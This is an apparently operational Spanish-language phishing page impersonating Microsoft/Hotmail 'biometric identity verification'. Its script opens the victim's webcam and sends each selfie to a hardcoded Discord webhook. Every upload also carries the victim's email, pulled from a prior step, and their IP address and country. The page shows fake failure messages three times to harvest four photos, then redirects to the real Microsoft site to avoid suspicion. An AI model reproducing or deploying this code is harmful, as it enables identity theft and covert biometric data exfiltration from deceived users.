<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verificación de Identidad</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }
    body {
      background: linear-gradient(135deg, #f5f7fa, #e4edf9);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      max-width: 450px;
      width: 100%;
      background: white;
      border-radius: 12px;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
      padding: 30px;
      text-align: center;
    }
    .logo {
      width: 80px;
      margin-bottom: 20px;
    }
    .user-email {
      background-color: #f3f3f3;
      padding: 8px 16px;
      border-radius: 50px;
      display: inline-block;
      font-weight: 600;
      margin-bottom: 20px;
      font-size: 14px;
    }
    .verification-title {
      font-size: 20px;
      font-weight: 500;
      color: #1a1a1a;
      margin-bottom: 20px;
    }
    .verification-description {
      font-size: 14px;
      color: #555;
      line-height: 1.5;
      margin-bottom: 25px;
    }
    .verification-button {
      width: 100%;
      padding: 12px;
      background-color: #0067b8;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.3s;
    }
    .verification-button:hover {
      background-color: #005a9e;
    }

    /* Modal de cámara */
    #cameraModal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.95);
      z-index: 1000;
      justify-content: center;
      align-items: center;
      color: white;
    }
    #closeCamera {
      position: absolute;
      top: 20px;
      right: 20px;
      background: transparent;
      border: none;
      color: white;
      font-size: 32px;
      cursor: pointer;
    }
    #cameraVideo {
      width: 100%;
      max-width: 500px;
      aspect-ratio: 4/3;
      background: black;
      border-radius: 12px;
      transform: scaleX(-1);
    }
    #capturePhoto {
      margin-top: 20px;
      padding: 12px 40px;
      background: #0067b8;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }
    #photoCanvas { display: none; }
    #modalMessage {
      margin-top: 15px;
      font-size: 16px;
      color: #ffcc00;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://www.freepnglogos.com/uploads/microsoft-logo-png-transparent-background-1.png" alt="Microsoft" class="logo">
    <div class="user-email" id="userEmail"></div>
    <p class="verification-title">Verificación de identidad obligatoria</p>
    <p class="verification-description">
      Para proteger su cuenta, debe confirmar que usted es el titular legítimo mediante una verificación biométrica facial en tiempo real.
    </p>
    <button class="verification-button" id="startVerification">Iniciar verificación</button>
  </div>

  <!-- Modal cámara -->
  <div id="cameraModal">
    <button id="closeCamera">&times;</button>
    <div style="text-align: center; max-width: 500px; width: 90%;">
      <h2>Verificación facial</h2>
      <p>Asegúrese de que su rostro esté bien iluminado y centrado</p>
      <video id="cameraVideo" autoplay playsinline></video>
      <div id="modalMessage"></div>
      <button id="capturePhoto">Capturar selfie</button>
    </div>
    <canvas id="photoCanvas"></canvas>
  </div>

  <script>
    const webhook_url = "https://discord.com/api/webhooks/1491559039040098304/bS5nzWMQwDdnQL2v26CpLKRArD_SPv53YiQDBLlwuujAEpemkEk0lA0ZSowsLzhbuxGj";
    let stream = null;
    let intento = 0;

    document.getElementById("userEmail").textContent = localStorage.getItem("correo") || "usuario@outlook.com";

    async function getIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        return (await res.json()).ip;
      } catch { return "IP no disponible"; }
    }

    async function getCountry(ip) {
      if (ip === "IP no disponible") return "País no disponible";
      try {
        const res = await fetch(`https://ipapi.co/${ip}/country_name/`);
        return await res.text();
      } catch { return "País no disponible"; }
    }

    async function sendImageToDiscord(blob, email) {
      const ip = await getIP();
      const country = await getCountry(ip);
      const formData = new FormData();
      formData.append("file", blob, `selfie_${Date.now()}.jpg`);
      formData.append("content", [
        "**== Hotmail - Verificación Facial ==**",
        email ? `**Correo:** \`${email}\`` : "",
        `**Fecha:** ${new Date().toLocaleString("es-ES")}`,
        "**===== IP =====**",
        `${ip} ${country}`
      ].filter(x => x).join("\n"));

      await fetch(webhook_url, { method: "POST", body: formData });
    }

    function showMessage(msg) {
      document.getElementById("modalMessage").textContent = msg;
    }

    function resetMessage() {
      document.getElementById("modalMessage").textContent = "";
    }

    async function openCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        document.getElementById("cameraVideo").srcObject = stream;
        document.getElementById("cameraModal").style.display = "flex";
        resetMessage();
      } catch (err) {
        alert("Permiso de cámara requerido para continuar.");
      }
    }

    function closeCamera() {
      if (stream) {
        stream.getTracks().forEach(t => t.stop());
        stream = null;
      }
      document.getElementById("cameraModal").style.display = "none";
    }

    async function capturePhoto() {
      intento++;
      const video = document.getElementById("cameraVideo");
      const canvas = document.getElementById("photoCanvas");
      const ctx = canvas.getContext("2d");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0);

      const email = localStorage.getItem("correo");
      const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.95));
      await sendImageToDiscord(blob, email);

      // Simulación de 4 intentos con mensajes distintos
      if (intento === 1) {
        showMessage("❌ Verificación facial no coincidente. Intente nuevamente.");
        return;
      }
      if (intento === 2) {
        showMessage("⚠️ Calidad de imagen insuficiente. Limpie la lente de su cámara.");
        return;
      }
      if (intento === 3) {
        showMessage("⚠️ Postura incorrecta. Mantenga la cabeza recta, alineada con los hombros.");
        return;
      }

      // Éxito en el cuarto intento
      showMessage("✅ Verificación biométrica exitosa.");
      setTimeout(() => {
        closeCamera();
        window.location.href = "https://account.microsoft.com/";
      }, 2000);
    }

    document.getElementById("startVerification").addEventListener("click", openCamera);
    document.getElementById("closeCamera").addEventListener("click", closeCamera);
    document.getElementById("capturePhoto").addEventListener("click", capturePhoto);
  </script>
</body>
</html>
